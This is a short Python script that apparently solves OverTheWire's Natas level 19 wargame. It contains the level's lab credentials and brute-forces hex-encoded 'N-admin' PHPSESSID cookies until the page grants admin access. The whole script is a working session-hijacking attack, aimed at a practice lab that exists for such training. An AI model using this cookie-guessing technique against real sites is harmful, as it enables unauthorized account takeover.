#!/usr/bin/env python

import requests
import re

USER = 'natas19'
PASSWORD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = 'http://natas19.natas.labs.overthewire.org/index.php'

#r = requests.Session()
#response = r.post(url, data= {"username":"admin","password":"admin"},auth=(USER, PASSWORD))
#print(response.text)


for l in range(1,640):
  r = requests.Session()
  hexa = (str(l)+"-admin").encode('hex')
  response = r.post(url, cookies= {"PHPSESSID":hexa}, auth=(USER, PASSWORD))
  if "You are an admin" in response.text:
      print "[+] got it!!!"
      print response.text
      break
  else:
      print hexa

